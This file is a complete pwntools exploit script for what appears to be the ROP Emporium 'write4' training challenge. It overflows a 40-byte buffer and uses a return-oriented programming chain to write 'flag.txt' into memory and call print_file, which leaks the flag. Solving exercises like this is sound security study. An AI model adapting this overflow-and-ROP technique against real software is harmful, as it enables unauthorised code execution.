from pwn import *

data = 0x00601028 # rw-
print_file = 0x00400510 # plt
pop_rdi = 0x00400693 # pop rdi ; ret
pop_r14_r15 = 0x000400690 # pop r14 ; pop r15 ; ret
mov_qword = 0x00400628 # mov qword ptr [r14], r15 ; ret

payload = b"".join([
    b"A"*(32+8),
    p64(pop_r14_r15),
    p64(data),
    b"flag.txt",
    p64(mov_qword),
    p64(pop_rdi),
    p64(data),
    p64(print_file),
])

p = process("./write4")
#input("Waiting for debug")
p.send(payload+b"\n")

#p.interactive()
p.recvuntil(b"you!\n")
flag = p.recv()
print(f"Flag : {flag}")
